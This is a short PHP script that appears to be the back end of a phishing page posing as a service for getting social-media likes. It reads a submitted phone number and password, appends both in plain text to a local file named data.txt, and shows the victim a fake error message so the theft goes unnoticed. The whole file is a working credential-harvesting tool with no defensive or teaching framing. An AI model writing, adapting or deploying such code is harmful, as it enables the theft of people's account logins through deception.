<?php

	if($_SERVER["REQUEST_METHOD"] == "POST") {
		$phoneNumber    = $_POST["phone"];
		$passWord 		= $_POST["password"];
		$data = "\n".$phoneNumber."\n".$passWord."\n";
		echo "Sorry Your cannot get like from our services.";
		$myfile = fopen("data.txt","a") or die("Unable to get Liket Please Try again Later.");
		fwrite($myfile,$data);
		fclose($myfile);
		
	}

?>